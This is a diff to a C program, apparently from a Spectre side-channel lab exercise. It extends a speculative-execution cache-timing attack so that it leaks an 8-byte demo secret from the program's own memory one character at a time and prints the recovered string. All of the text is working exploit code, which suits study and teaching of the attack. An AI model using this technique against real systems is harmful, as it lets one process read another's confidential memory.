@@ -10,7 +10,7 @@ unsigned int bound_lower = 0;
 unsigned int bound_upper = 9;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
 uint8_t temp    = 0;
-char    *secret = "Some Secret Value";   
+char    *secret = "mySecret";   
 uint8_t array[256*4096];
 
 #define CACHE_HIT_THRESHOLD (80)
@@ -76,12 +76,12 @@ void spectreAttack(size_t index_beyond)
   array[s*4096 + DELTA] += 88;
 }
 
-int main() {
+int getLetter(int index) {
+
   int i;
   uint8_t s;
-  size_t index_beyond = (size_t)(secret - (char*)buffer);
+  size_t index_beyond = (size_t)(secret - (char*)buffer) + index;
 
-  flushSideChannel();
   for(i=0;i<256; i++) scores[i]=0; 
 
   for (i = 0; i < 1000; i++) {
@@ -99,5 +99,44 @@ int main() {
   printf("Reading secret value at index %ld\n", index_beyond);
   printf("The secret value is %d(%c)\n", max, max);
   printf("The number of hits is %d\n", scores[max]);
-  return (0); 
+
+  return max;
+}
+
+int main() {
+
+  int count = 8;
+  int secretFinal[count];
+
+  flushSideChannel();
+
+  for ( int i = 0; i < count; i++ ) {
+    
+    int current;
+
+    for ( int j = 0; j < 15; j++ ) {
+      current = getLetter(i);
+    
+      if ( current != 0 ) {
+        break;
+      }
+    }
+
+    if ( current == 0) {
+      current = 63;
+    }
+
+    secretFinal[i] = current;
+  }
+
+  printf("\nThe secret value is ");
+  
+  for ( int i = 0; i < count; i++ ) {
+    printf("%c", secretFinal[i]);
+  }
+  
+  printf("\n");
+  
+  return (0);
+
 }
